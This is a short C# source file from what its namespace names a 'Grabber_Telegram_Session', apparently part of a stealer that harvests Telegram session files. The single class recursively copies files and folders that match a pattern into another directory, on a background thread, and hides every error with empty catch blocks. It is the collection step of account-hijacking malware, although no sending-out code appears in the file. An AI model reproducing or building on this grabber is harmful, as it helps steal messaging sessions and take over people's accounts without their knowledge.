namespace Grabber_Telegram_Session
{
    using System.IO;
    using System.Threading;

    public class CopySession
    {
        public static void GetFilesSession(string Expansion, string From, string To, bool True = true)
        {
            try
            {     
                new Thread(() =>
                {
                    if (Directory.Exists(From))
                    {
                        if (!Directory.Exists(To))
                        {
                            Directory.CreateDirectory(To);
                            foreach (var file in Directory.GetFiles(From, Expansion))
                            {
                                try
                                {
                                    File.Copy(file, Path.Combine(To, Path.GetFileName(file)));
                                }
                                catch { }
                            }
                            foreach (var dirPath in Directory.GetDirectories(From, Expansion, SearchOption.AllDirectories))
                            {
                                try
                                {
                                    Directory.CreateDirectory(dirPath.Replace(From, To));
                                }
                                catch { }
                            }
                            foreach (var newPath in Directory.GetFiles(From, Expansion, SearchOption.AllDirectories))
                            {
                                try
                                {
                                    File.Copy(newPath, newPath.Replace(From, To), True);
                                }
                                catch { }
                            }
                        }
                    }
                }).Start();             
            }
            catch { }
        }
    }
}